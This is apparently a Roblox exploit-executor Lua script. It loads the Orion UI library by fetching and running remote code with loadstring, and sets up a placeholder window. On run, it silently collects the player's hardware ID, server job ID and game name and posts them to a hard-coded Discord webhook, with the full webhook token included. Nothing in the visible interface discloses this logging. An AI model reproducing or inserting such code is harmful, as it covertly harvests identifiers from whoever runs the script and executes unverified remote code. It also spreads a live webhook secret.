local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "Title of the library", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})

local Tab = Window:MakeTab({
	Name = "Tab 1",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Section = Tab:AddSection({
	Name = "Section"
})



local HttpService = game:GetService("HttpService")
local Webhook_URL = "https://discord.com/api/webhooks/1252605093694668861/xkCorsjmsrvz-BKM0t93wxxTXwNebv9YLSgEMJkvGeFfre5yQ93cf5aTCJCyMbvCkdQt" -- Replace with your actual webhook URL

local jobid = game.JobId
local Userid = game.Players.LocalPlayer.UserId
local DName = game.Players.LocalPlayer.DisplayName
local Name = game.Players.LocalPlayer.Name
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
local GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name

local requestfunc = syn and syn.request or request or http_request or http.request or fluxus and fluxus.request or game.HttpGet

local function sendNotification()
    local req = requestfunc({
        Url = Webhook_URL,
        Method = 'POST',
        Headers = {
            ['Content-Type'] = 'application/json'
        },
        Body = HttpService:JSONEncode({
            ["content"] = "",
            ["embeds"] = {{
                ["title"] = "Ez",
                ["color"] = tonumber(0xFF0000),
                ["description"] = "Hwid: " .. hwid,
                ["fields"] = {
                    { name = "Job ID", value = jobid },
                    { name = "Name", value = "HTTP Ghost" },
                    { name = "Game Name", value = GameName }
                }
            }}
        })
    })
end

sendNotification()
